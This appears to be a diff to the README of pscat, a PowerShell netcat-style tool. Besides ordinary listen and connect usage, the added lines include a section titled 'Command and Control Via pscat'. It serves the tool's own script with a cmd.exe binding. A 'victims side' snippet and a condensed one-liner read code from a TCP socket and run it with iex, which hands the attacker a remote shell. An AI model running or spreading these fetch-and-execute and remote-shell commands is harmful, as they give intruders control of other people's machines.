@@ -24,6 +24,12 @@ pscat -Connect -Address 127.0.0.1 -Port 4444
 # Pipe process
 pscat -Listen -Port 4444 -Execute cmd.exe
 
+# Pipeline data
+"Hello, World!" | pscat -Listen -Port 4444
+
+# Utilize Tcp Client
+pscat -UtilizeGuest $TcpClient
+
 # Help
 pscat -Help
 
@@ -32,6 +38,23 @@ pc -l -p 4444
 pc -c 127.0.0.1 4444
 pc -l -p 4444 -e cmd.exe
 pc -h
+```
+
+```powershell
+# Command and Control Via pscat
+$Content = Get-Content pscat.ps1 | Out-String
+$Payload = $Content + 'pc -u $TcpClient -e cmd.exe'
+$Payload | pc -l -p 4444 -v
+
+# From the Victims side
+$TcpClient = [Net.Sockets.TcpClient]::new("127.0.0.1", 4444)
+$Buffer = [Byte[]]::new(65535)
+$Read = $TcpClient.GetStream().Read($Buffer, 0, $Buffer.Length)
+$Data = [Text.Encoding]::ASCII.GetString($Buffer, 0, $Read)
+iex $Data
+
+# or
+$t=[net.sockets.tcpclient]::new('127.0.0.1',4444);$b=[byte[]]::new(65535);$r=$t.getstream().read($b,0,65535);[text.encoding]::ascii.getstring($b,0,$r)|iex
 ```
 
 ## **Brief Explanation**
